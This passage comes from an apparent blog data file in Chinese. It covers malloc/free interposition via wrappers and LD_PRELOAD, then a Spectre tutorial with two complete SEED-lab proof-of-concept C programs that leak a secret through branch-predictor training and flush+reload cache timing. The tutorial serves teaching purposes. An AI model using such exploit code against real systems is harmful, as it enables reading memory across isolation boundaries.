*mymalloc(size_t size);\nvoid myfree(void *ptr);</code></pre><pre><code>//mymalloc.c\n#ifdef COMPILETIME\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\n//malloc wrapper function \n\nvoid *mymalloc(size_t size){\n    void *ptr = malloc(size);\n    printf(&quot;malloc(%d)=%p\\n&quot;,(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid myfree(void *ptr){\n    free(ptr);\n    printf(&quot;free(%p)\\n&quot;,ptr);\n}\n#endif</code></pre><p>运行./intc，可以看到结果如下：</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ gcc -DCOMPILETIME -c mymalloc.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -I. -o int int.c mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./int \nmalloc(32)=0x5612ed48b260\ncomplete task\nfree(0x5612ed48b260)</code></pre><h2 id=\"链接时注入\"><a href=\"#链接时注入\" class=\"headerlink\" title=\"链接时注入\"></a>链接时注入</h2><p>与编译时注入不同，链接时注入发生在链接阶段，链接阶段是对两个可重定位目标文件进行链接，可以对符号进行重定位。在注入前，我们需要准备如下的mymalloc.c文件并对它进行编译成可重定位文件。里面的函数定义与链接器的命令有关。编译命令如下：</p>\n<pre><code>gcc -DLINKTIME -c mymalloc.c\ngcc -c int.c</code></pre><pre><code>//mymalloc.c\n#ifdef LINKTIME\n#include &lt;stdio.h&gt;\n//#include &lt;malloc.h&gt;\nvoid *__real_malloc(size_t size);\nvoid __real_free(void *ptr);\n//malloc wrapper function \n\nvoid *__wrap_malloc(size_t size){\n    void *ptr = __real_malloc(size);\n    printf(&quot;malloc(%d)=%p\\n&quot;,(int)size,ptr);\n    return ptr;\n}\n\n//free wrapper function\nvoid __wrap_free(void *ptr){\n    __real_free(ptr);\n    printf(&quot;free(%p)\\n&quot;,ptr);\n}\n#endif</code></pre><p>当我们获得两个可重定位目标文件后，然后就是链接器的工作了。我们从命令上来分析链接器如何完成注入，命令如下：</p>\n<pre><code>gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \n</code></pre><p>-Wl告诉编译器将后面的参数传给链接器，–wrap参数会将符号f解析为<strong>wrap_f，而将</strong>real_f解析成f,在我们的命令里就是会把malloc解析成<strong>wrap_malloc，而</strong>real_malloc则会被解析成malloc（就是libc里面的malloc函数）这样一来，就完成了malloc函数的注入，free也是同样的道理。最后运行的结果如下。</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ gcc -DLINKTIME -c mymalloc.c\nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -c int.c \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o \nsaxon@ubuntu:~/Desktop/library_interposition$ ./intl \nmalloc(32)=0x55cb46bac260\ncomplete task\nfree(0x55cb46bac260)</code></pre><h2 id=\"运行时注入\"><a href=\"#运行时注入\" class=\"headerlink\" title=\"运行时注入\"></a>运行时注入</h2><p>由于编译时注入和链接时注入分别需要源文件的源代码和源文件的可重定位目标文件，在现实中应用的场景不多，而运行时注入只需要源文件的可执行文件即可完成注入。这种机制的实现得益于动态链接器的一个系统变量LD_PRELOAD,程序在寻找动态链接库之前，会先到这个变量定义的路径中去寻找，然后再去系统定义的路径中去寻找动态链接库。mymalloc.c文件如下：</p>\n<pre><code>//mymalloc.c\n#ifdef RUNTIME\n#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;dlfcn.h&gt;\n\n/* malloc wrapper function */\nvoid *malloc(size_t size)\n{\n    void *(*mallocp)(size_t size);\n    char *error;\n    static __thread int print_times = 0;\n    print_times++;\n\n    mallocp = dlsym(RTLD_NEXT, &quot;malloc&quot;); /* Get address of libc malloc */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    char *ptr = mallocp(size); /* Call libc malloc */\n    if (print_times == 1)\n    {\n        printf(&quot;malloc(%d) = %p\\n&quot;, (int)size, ptr);\n    }\n    return ptr;\n}\n\n/* free wrapper function */\nvoid free(void *ptr)\n{\n    void (*freep)(void *) = NULL;\n    char *error;\n\n    if (!ptr)\n        return;\n\n    freep = dlsym(RTLD_NEXT, &quot;free&quot;); /* Get address of libc free */\n    if ((error = dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    freep(ptr); /* Call libc free */\n    printf(&quot;free(%p)\\n&quot;, ptr);\n}\n#endif\n/* $end interposer */</code></pre><p>这里，和csapp里面的源代码有点不同，不同之处在于静态变量print_times，在csapp里面没有这个变量。由于新的malloc函数中调用了printf函数，而printf函数在实现时可能也调用了malloc函数，这会导致两个函数不断的互相调用对方，最后导致栈溢出，报出segmentation fault。引入print_times后，由于是静态变量，只有当第一次调用malloc是，才会调用printf函数，避免了互相调用的死循环。<br>首先，我们编译动态库和可执行文件：</p>\n<pre><code>gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl\ngcc -o intr int.c</code></pre><p>然后在运行代码时指定LD_PRELOAD变量并运行可执行文件./intr</p>\n<pre><code>LD_PRELOAD=&quot;./mymalloc.so&quot;  ./intr </code></pre><p>最后发现运行结果如下：</p>\n<pre><code>saxon@ubuntu:~/Desktop/library_interposition$ LD_PRELOAD=&quot;./mymalloc.so&quot;  ./intr \nmalloc(32) = 0x5583182ab260\ncomplete task\nfree(0x5583182ab260)</code></pre>"},{"title":"Spectre Attack","date":"2019-10-05T07:00:00.000Z","catalog":true,"subtitle":null,"header-img":null,"top":false,"_content":"## \bSpectre攻击概述\nSpectre攻击是一种利用cpu在执行代码时的漏洞，诱使victim程序执行其本不该执行的代码导致数据的泄漏，在2017年被发现直到2018年才会公开，影响了大量的使用Intel，ARM，AMD芯片的设备。\n## 攻击涉及主要技术\n### CPU预测执行\n由于现在CPU的频率提高越来越困难（频率越高，导致温度变高，容易烧坏芯片），CPU普遍采用两中技术来提高cpu执行代码的速度，一种是乱序执行，通过将相互独立的指令并行执行来提高执行的速度（被用在meltdown攻击中）。另一种就是预测执行，它的应用场景是cpu在应用乱序执行机制执行代码时，当遇到一些跳转时（比如条件跳转，间接跳转），如果跳转的产生需要依赖与一些未完成的指令，导致不能马上执行跳转，此时，cpu便会执行预测执行，预测跳转的目的地并继续往下执行。\n### 基于缓存的侧信道攻击\nflush+reload方法是Yuval Yarom和Katrina Falkner两位大牛在2014年的usenix上提出。程序在访问某一地址内存时，如果该内存之前被访问过，则会放在缓存中，则此次访问会产生一个缓存命中，导致访问速度比一般访问内存快很多。这很大程度提高了计算机访问内存的速度，但也给攻击者带来了可趁之机。攻击者可以扫描内存，对每一次的访问内存进行计时，根据缓存命中与否的访问时间上的差异，可以确定该内存是否被访问过。这个方法针对不同的场景有不同的用法。那两位作者在他们的论文中用这个方法获得了rsa算法的密钥。Spectre用这个方法读取了相关内存的值，具体的会在下面介绍。\n## Spectre攻击流程\nSpectre攻击在论文中实施了两种攻击，一种是针对条件跳转的，一种是针对间接跳转的。由于间接跳转的比较复杂，本文就对条件跳转的攻击进行讨论。\n我们先来看一下代码\n```\nif(x<array1_size){\n    y=array2[array1[x]*4096];\n}\n \n```\n按照程序的正常运行，只有当x满足条件x< array1_size，时，程序才会执行下面的语句，但是当攻击者可以控制预测执行时，攻击者就可以在x> array1_size的情况下使程序执行下面的语句。大家有兴趣的可以用一下代码尝试，该代码取自seedlab中的spectreattack实验。\n```\n#include <emmintrin.h>\n#include <x86intrin.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nint size = 10;\nuint8_t array[256*4096];\nuint8_t temp = 0;\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i < 256; i++){\n    addr = &array[i*4096 + DELTA];\n    time1 = __rdtscp(&junk);\n    junk = *addr;\n    time2 = __rdtscp(&junk) - time1;\n    if (time2 <= CACHE_HIT_THRESHOLD){\n\tprintf(\"array[%d*4096 + %d] is in cache.\\n\", i, DELTA);\n        printf(\"The Secret = %d.\\n\",i);\n    }\n  } \n}\n\nvoid victim(size_t x)\n{\n  if (x < size) {  \n  temp = array[x * 4096 + DELTA];  \n  }\n}\n\nint main() {\n  int i;\n  // FLUSH the probing array\n  flushSideChannel();\n  // Train the CPU to take the true branch inside victim()\n  for (i = 0; i < 10; i++) {   \n   _mm_clflush(&size); \n   victim(i);\n  }\n  // Exploit the out-of-order execution\n  _mm_clflush(&size);\n  for (i = 0; i < 256; i++)\n   _mm_clflush(&array[i*4096 + DELTA]); \n  victim(97);  \n  // RELOAD the probing array\n  reloadSideChannel();\n  return (0); \n}\n```\n在上面的victim程序中，x假设是一个我们想要访问的值，之所以要乘4096是为了相邻两个x值之间的距离，防止prefetch机制。DELTA是为了防止一个在i=0时，程序在访问本地变量的时候，cache会一个line大小的数据（包括array[0]）全放入缓存，导致flush过程的失败。\n\n控制预测执行成功后，我们模拟一个应用场景，比如说在浏览器浏览网页时，不同网页是在一个进程中的，而进程内的隔离一般是通过sandbox技术实现，在sandbox中，常见的隔离手段是通过边界检查，例如下面的代码：\n```\nif (address_want_to_access<permitted_address_size){\n  return memory[address_want_to_access]\n}\n```\n试想，如果我们能够绕过边界检查，把我们要读取的内存作为内存地址放在缓存中，然后再用flush+reload技术获得缓存中存储的内存地址，这样一顿操作后，我们是不是就能读取想要的数据了？\n我们来看如下代码片段，我们假设我们已经训练好预测执行，victim函数是一个边界检查函数，x是我们想要读取的内存地址，我们调用victim函数并将结果放到数组中进行运算，这是为了将数据能够泄漏到缓存中，使得我们能用flush+reload技术去读取想要读取的数据。\n```\nuint8_t victim(x){\n\n  if(x<buffer_size){\n    return buffer[x]\n  }else{\n    return 0\n  }\n}\n\nint main(){\n  x=address_want_to_read;\n  s=victim(x);               //读取指定数据\n  array[s*4096+DELTA]+=99;//为了访问内存，将数据泄漏到缓存中\n}\n```\n最后附上一个seedlab上spectreattack的一个程序代码\n```\n#include <emmintrin.h>\n#include <x86intrin.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nunsigned int buffer_size = 10;\nuint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; \nuint8_t temp = 0;\nchar *secret = \"Some Secret Value\";   \nuint8_t array[256*4096];\n\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\n// Sandbox Function\nuint8_t restrictedAccess(size_t x)\n{\n  if (x < buffer_size) {\n     return buffer[x];\n  } else {\n     return 0;\n  } \n}\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i < 256; i++){\n    addr = &array[i*4096 + DELTA];\n    time1 = __rdtscp(&junk);\n    junk = *addr;\n    time2 = __rdtscp(&junk) - time1;\n    if (time2 <= CACHE_HIT_THRESHOLD){\n\tprintf(\"array[%d*4096 + %d] is in cache.\\n\", i, DELTA);\n        printf(\"The Secret = %d.\\n\",i);\n    }\n  } \n}\nvoid spectreAttack(size_t larger_x)\n{\n  int i;\n  uint8_t s;\n  volatile int z;\n  // Train the CPU to take the true branch inside restrictedAccess().\n  for (i = 0; i < 10; i++) { \n   _mm_clflush(&buffer_size);\n   restrictedAccess(i); \n  }\n  // Flush buffer_size and array[] from the cache.\n  _mm_clflush(&buffer_size);\n  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }\n  for (z = 0; z < 100; z++) { }\n  // Ask restrictedAccess() to return the secret in out-of-order execution. \n  s = restrictedAccess(larger_x);  \n  array[s*4096 + DELTA] += 88;  \n}\n\nint main() {\n  flushSideChannel();\n  size_t larger_x = (size_t)(secret - (char*)buffer);  \n  spectreAttack(larger_x);\n  reloadSideChannel();\n  return (0);\n}\n```\n[关于seedlab的spectre attack详细介绍请看](https://seedsecuritylabs.org/Labs_16.04/PDF/Spectre_Attack.pdf)\n\n以上就是spectre的基本思想，论述的不清楚的地方请大家多多见谅,欢迎大家与我一起交流学习","source":"_posts/spectre-mac.md","raw":"---\ntitle: Spectre Attack\ndate: 2019.10.5\ncatalog: true\nsubtitle: \nheader-img: \ntop: false\ntags: \ncategories: Security \n---\n## \bSpectre攻击概述\nSpectre攻击是一种利用cpu在执行代码时的漏洞，诱使victim程序执行其本不该执行的代码导致数据的泄漏，在2017年被发现直到2018年才会公开，影响了大量的使用Intel，ARM，AMD芯片的设备。\n## 攻击涉及主要技术\n### CPU预测执行\n由于现在CPU的频率提高越来越困难（频率越高，导致温度变高，容易烧坏芯片），CPU普遍采用两中技术来提高cpu执行代码的速度，一种是乱序执行，通过将相互独立的指令并行执行来提高执行的速度（被用在meltdown攻击中）。另一种就是预测执行，它的应用场景是cpu在应用乱序执行机制执行代码时，当遇到一些跳转时（比如条件跳转，间接跳转），如果跳转的产生需要依赖与一些未完成的指令，导致不能马上执行跳转，此时，cpu便会执行预测执行，预测跳转的目的地并继续往下执行。\n### 基于缓存的侧信道攻击\nflush+reload方法是Yuval Yarom和Katrina Falkner两位大牛在2014年的usenix上提出。程序在访问某一地址内存时，如果该内存之前被访问过，则会放在缓存中，则此次访问会产生一个缓存命中，导致访问速度比一般访问内存快很多。这很大程度提高了计算机访问内存的速度，但也给攻击者带来了可趁之机。攻击者可以扫描内存，对每一次的访问内存进行计时，根据缓存命中与否的访问时间上的差异，可以确定该内存是否被访问过。这个方法针对不同的场景有不同的用法。那两位作者在他们的论文中用这个方法获得了rsa算法的密钥。Spectre用这个方法读取了相关内存的值，具体的会在下面介绍。\n## Spectre攻击流程\nSpectre攻击在论文中实施了两种攻击，一种是针对条件跳转的，一种是针对间接跳转的。由于间接跳转的比较复杂，本文就对条件跳转的攻击进行讨论。\n我们先来看一下代码\n```\nif(x<array1_size){\n    y=array2[array1[x]*4096];\n}\n \n```\n按照程序的正常运行，只有当x满足条件x< array1_size，时，程序才会执行下面的语句，但是当攻击者可以控制预测执行时，攻击者就可以在x> array1_size的情况下使程序执行下面的语句。大家有兴趣的可以用一下代码尝试，该代码取自seedlab中的spectreattack实验。\n```\n#include <emmintrin.h>\n#include <x86intrin.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nint size = 10;\nuint8_t array[256*4096];\nuint8_t temp = 0;\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i < 256; i++){\n    addr = &array[i*4096 + DELTA];\n    time1 = __rdtscp(&junk);\n    junk = *addr;\n    time2 = __rdtscp(&junk) - time1;\n    if (time2 <= CACHE_HIT_THRESHOLD){\n\tprintf(\"array[%d*4096 + %d] is in cache.\\n\", i, DELTA);\n        printf(\"The Secret = %d.\\n\",i);\n    }\n  } \n}\n\nvoid victim(size_t x)\n{\n  if (x < size) {  \n  temp = array[x * 4096 + DELTA];  \n  }\n}\n\nint main() {\n  int i;\n  // FLUSH the probing array\n  flushSideChannel();\n  // Train the CPU to take the true branch inside victim()\n  for (i = 0; i < 10; i++) {   \n   _mm_clflush(&size); \n   victim(i);\n  }\n  // Exploit the out-of-order execution\n  _mm_clflush(&size);\n  for (i = 0; i < 256; i++)\n   _mm_clflush(&array[i*4096 + DELTA]); \n  victim(97);  \n  // RELOAD the probing array\n  reloadSideChannel();\n  return (0); \n}\n```\n在上面的victim程序中，x假设是一个我们想要访问的值，之所以要乘4096是为了相邻两个x值之间的距离，防止prefetch机制。DELTA是为了防止一个在i=0时，程序在访问本地变量的时候，cache会一个line大小的数据（包括array[0]）全放入缓存，导致flush过程的失败。\n\n控制预测执行成功后，我们模拟一个应用场景，比如说在浏览器浏览网页时，不同网页是在一个进程中的，而进程内的隔离一般是通过sandbox技术实现，在sandbox中，常见的隔离手段是通过边界检查，例如下面的代码：\n```\nif (address_want_to_access<permitted_address_size){\n  return memory[address_want_to_access]\n}\n```\n试想，如果我们能够绕过边界检查，把我们要读取的内存作为内存地址放在缓存中，然后再用flush+reload技术获得缓存中存储的内存地址，这样一顿操作后，我们是不是就能读取想要的数据了？\n我们来看如下代码片段，我们假设我们已经训练好预测执行，victim函数是一个边界检查函数，x是我们想要读取的内存地址，我们调用victim函数并将结果放到数组中进行运算，这是为了将数据能够泄漏到缓存中，使得我们能用flush+reload技术去读取想要读取的数据。\n```\nuint8_t victim(x){\n\n  if(x<buffer_size){\n    return buffer[x]\n  }else{\n    return 0\n  }\n}\n\nint main(){\n  x=address_want_to_read;\n  s=victim(x);               //读取指定数据\n  array[s*4096+DELTA]+=99;//为了访问内存，将数据泄漏到缓存中\n}\n```\n最后附上一个seedlab上spectreattack的一个程序代码\n```\n#include <emmintrin.h>\n#include <x86intrin.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nunsigned int buffer_size = 10;\nuint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; \nuint8_t temp = 0;\nchar *secret = \"Some Secret Value\";   \nuint8_t array[256*4096];\n\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\n// Sandbox Function\nuint8_t restrictedAccess(size_t x)\n{\n  if (x < buffer_size) {\n     return buffer[x];\n  } else {\n     return 0;\n  } \n}\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i < 256; i++){\n    addr = &array[i*4096 + DELTA];\n    time1 = __rdtscp(&junk);\n    junk = *addr;\n    time2 = __rdtscp(&junk) - time1;\n    if (time2 <= CACHE_HIT_THRESHOLD){\n\tprintf(\"array[%d*4096 + %d] is in cache.\\n\", i, DELTA);\n        printf(\"The Secret = %d.\\n\",i);\n    }\n  } \n}\nvoid spectreAttack(size_t larger_x)\n{\n  int i;\n  uint8_t s;\n  volatile int z;\n  // Train the CPU to take the true branch inside restrictedAccess().\n  for (i = 0; i < 10; i++) { \n   _mm_clflush(&buffer_size);\n   restrictedAccess(i); \n  }\n  // Flush buffer_size and array[] from the cache.\n  _mm_clflush(&buffer_size);\n  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }\n  for (z = 0; z < 100; z++) { }\n  // Ask restrictedAccess() to return the secret in out-of-order execution. \n  s = restrictedAccess(larger_x);  \n  array[s*4096 + DELTA] += 88;  \n}\n\nint main() {\n  flushSideChannel();\n  size_t larger_x = (size_t)(secret - (char*)buffer);  \n  spectreAttack(larger_x);\n  reloadSideChannel();\n  return (0);\n}\n```\n[关于seedlab的spectre attack详细介绍请看](https://seedsecuritylabs.org/Labs_16.04/PDF/Spectre_Attack.pdf)\n\n以上就是spectre的基本思想，论述的不清楚的地方请大家多多见谅,欢迎大家与我一起交流学习","slug":"spectre-mac","published":1,"updated":"2020-10-04T05:13:07.445Z","_id":"ckfq5d2zx0004dljxz6vzgctk","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Spectre攻击概述\"><a href=\"#Spectre攻击概述\" class=\"headerlink\" title=\"\bSpectre攻击概述\"></a>\bSpectre攻击概述</h2><p>Spectre攻击是一种利用cpu在执行代码时的漏洞，诱使victim程序执行其本不该执行的代码导致数据的泄漏，在2017年被发现直到2018年才会公开，影响了大量的使用Intel，ARM，AMD芯片的设备。</p>\n<h2 id=\"攻击涉及主要技术\"><a href=\"#攻击涉及主要技术\" class=\"headerlink\" title=\"攻击涉及主要技术\"></a>攻击涉及主要技术</h2><h3 id=\"CPU预测执行\"><a href=\"#CPU预测执行\" class=\"headerlink\" title=\"CPU预测执行\"></a>CPU预测执行</h3><p>由于现在CPU的频率提高越来越困难（频率越高，导致温度变高，容易烧坏芯片），CPU普遍采用两中技术来提高cpu执行代码的速度，一种是乱序执行，通过将相互独立的指令并行执行来提高执行的速度（被用在meltdown攻击中）。另一种就是预测执行，它的应用场景是cpu在应用乱序执行机制执行代码时，当遇到一些跳转时（比如条件跳转，间接跳转），如果跳转的产生需要依赖与一些未完成的指令，导致不能马上执行跳转，此时，cpu便会执行预测执行，预测跳转的目的地并继续往下执行。</p>\n<h3 id=\"基于缓存的侧信道攻击\"><a href=\"#基于缓存的侧信道攻击\" class=\"headerlink\" title=\"基于缓存的侧信道攻击\"></a>基于缓存的侧信道攻击</h3><p>flush+reload方法是Yuval Yarom和Katrina Falkner两位大牛在2014年的usenix上提出。程序在访问某一地址内存时，如果该内存之前被访问过，则会放在缓存中，则此次访问会产生一个缓存命中，导致访问速度比一般访问内存快很多。这很大程度提高了计算机访问内存的速度，但也给攻击者带来了可趁之机。攻击者可以扫描内存，对每一次的访问内存进行计时，根据缓存命中与否的访问时间上的差异，可以确定该内存是否被访问过。这个方法针对不同的场景有不同的用法。那两位作者在他们的论文中用这个方法获得了rsa算法的密钥。Spectre用这个方法读取了相关内存的值，具体的会在下面介绍。</p>\n<h2 id=\"Spectre攻击流程\"><a href=\"#Spectre攻击流程\" class=\"headerlink\" title=\"Spectre攻击流程\"></a>Spectre攻击流程</h2><p>Spectre攻击在论文中实施了两种攻击，一种是针对条件跳转的，一种是针对间接跳转的。由于间接跳转的比较复杂，本文就对条件跳转的攻击进行讨论。<br>我们先来看一下代码</p>\n<pre><code>if(x&lt;array1_size){\n    y=array2[array1[x]*4096];\n}\n</code></pre><p>按照程序的正常运行，只有当x满足条件x&lt; array1_size，时，程序才会执行下面的语句，但是当攻击者可以控制预测执行时，攻击者就可以在x&gt; array1_size的情况下使程序执行下面的语句。大家有兴趣的可以用一下代码尝试，该代码取自seedlab中的spectreattack实验。</p>\n<pre><code>#include &lt;emmintrin.h&gt;\n#include &lt;x86intrin.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nint size = 10;\nuint8_t array[256*4096];\nuint8_t temp = 0;\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i &lt; 256; i++){\n    addr = &amp;array[i*4096 + DELTA];\n    time1 = __rdtscp(&amp;junk);\n    junk = *addr;\n    time2 = __rdtscp(&amp;junk) - time1;\n    if (time2 &lt;= CACHE_HIT_THRESHOLD){\n    printf(&quot;array[%d*4096 + %d] is in cache.\\n&quot;, i, DELTA);\n        printf(&quot;The Secret = %d.\\n&quot;,i);\n    }\n  } \n}\n\nvoid victim(size_t x)\n{\n  if (x &lt; size) {  \n  temp = array[x * 4096 + DELTA];  \n  }\n}\n\nint main() {\n  int i;\n  // FLUSH the probing array\n  flushSideChannel();\n  // Train the CPU to take the true branch inside victim()\n  for (i = 0; i &lt; 10; i++) {   \n   _mm_clflush(&amp;size); \n   victim(i);\n  }\n  // Exploit the out-of-order execution\n  _mm_clflush(&amp;size);\n  for (i = 0; i &lt; 256; i++)\n   _mm_clflush(&amp;array[i*4096 + DELTA]); \n  victim(97);  \n  // RELOAD the probing array\n  reloadSideChannel();\n  return (0); \n}</code></pre><p>在上面的victim程序中，x假设是一个我们想要访问的值，之所以要乘4096是为了相邻两个x值之间的距离，防止prefetch机制。DELTA是为了防止一个在i=0时，程序在访问本地变量的时候，cache会一个line大小的数据（包括array[0]）全放入缓存，导致flush过程的失败。</p>\n<p>控制预测执行成功后，我们模拟一个应用场景，比如说在浏览器浏览网页时，不同网页是在一个进程中的，而进程内的隔离一般是通过sandbox技术实现，在sandbox中，常见的隔离手段是通过边界检查，例如下面的代码：</p>\n<pre><code>if (address_want_to_access&lt;permitted_address_size){\n  return memory[address_want_to_access]\n}</code></pre><p>试想，如果我们能够绕过边界检查，把我们要读取的内存作为内存地址放在缓存中，然后再用flush+reload技术获得缓存中存储的内存地址，这样一顿操作后，我们是不是就能读取想要的数据了？<br>我们来看如下代码片段，我们假设我们已经训练好预测执行，victim函数是一个边界检查函数，x是我们想要读取的内存地址，我们调用victim函数并将结果放到数组中进行运算，这是为了将数据能够泄漏到缓存中，使得我们能用flush+reload技术去读取想要读取的数据。</p>\n<pre><code>uint8_t victim(x){\n\n  if(x&lt;buffer_size){\n    return buffer[x]\n  }else{\n    return 0\n  }\n}\n\nint main(){\n  x=address_want_to_read;\n  s=victim(x);               //读取指定数据\n  array[s*4096+DELTA]+=99;//为了访问内存，将数据泄漏到缓存中\n}</code></pre><p>最后附上一个seedlab上spectreattack的一个程序代码</p>\n<pre><code>#include &lt;emmintrin.h&gt;\n#include &lt;x86intrin.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nunsigned int buffer_size = 10;\nuint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; \nuint8_t temp = 0;\nchar *secret = &quot;Some Secret Value&quot;;   \nuint8_t array[256*4096];\n\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\n// Sandbox Function\nuint8_t restrictedAccess(size_t x)\n{\n  if (x &lt; buffer_size) {\n     return buffer[x];\n  } else {\n     return 0;\n  } \n}\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i &lt; 256; i++){\n    addr = &amp;array[i*4096 + DELTA];\n    time1 = __rdtscp(&amp;junk);\n    junk = *addr;\n    time2 = __rdtscp(&amp;junk) - time1;\n    if (time2 &lt;= CACHE_HIT_THRESHOLD){\n    printf(&quot;array[%d*4096 + %d] is in cache.\\n&quot;, i, DELTA);\n        printf(&quot;The Secret = %d.\\n&quot;,i);\n    }\n  } \n}\nvoid spectreAttack(size_t larger_x)\n{\n  int i;\n  uint8_t s;\n  volatile int z;\n  // Train the CPU to take the true branch inside restrictedAccess().\n  for (i = 0; i &lt; 10; i++) { \n   _mm_clflush(&amp;buffer_size);\n   restrictedAccess(i); \n  }\n  // Flush buffer_size and array[] from the cache.\n  _mm_clflush(&amp;buffer_size);\n  for (i = 0; i &lt; 256; i++)  { _mm_clflush(&amp;array[i*4096 + DELTA]); }\n  for (z = 0; z &lt; 100; z++) { }\n  // Ask restrictedAccess() to return the secret in out-of-order execution. \n  s = restrictedAccess(larger_x);  \n  array[s*4096 + DELTA] += 88;  \n}\n\nint main() {\n  flushSideChannel();\n  size_t larger_x = (size_t)(secret - (char*)buffer);  \n  spectreAttack(larger_x);\n  reloadSideChannel();\n  return (0);\n}</code></pre><p><a href=\"https://seedsecuritylabs.org/Labs_16.04/PDF/Spectre_Attack.pdf\" target=\"_blank\" rel=\"noopener\">关于seedlab的spectre attack详细介绍请看</a></p>\n<p>以上就是spectre的基本思想，论述的不清楚的地方请大家多多见谅,欢迎大家与我一起交流学习</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Spectre攻击概述\"><a href=\"#Spectre攻击概述\" class=\"headerlink\" title=\"\bSpectre攻击概述\"></a>\bSpectre攻击概述</h2><p>Spectre攻击是一种利用cpu在执行代码时的漏洞，诱使victim程序执行其本不该执行的代码导致数据的泄漏，在2017年被发现直到2018年才会公开，影响了大量的使用Intel，ARM，AMD芯片的设备。</p>\n<h2 id=\"攻击涉及主要技术\"><a href=\"#攻击涉及主要技术\" class=\"headerlink\" title=\"攻击涉及主要技术\"></a>攻击涉及主要技术</h2><h3 id=\"CPU预测执行\"><a href=\"#CPU预测执行\" class=\"headerlink\" 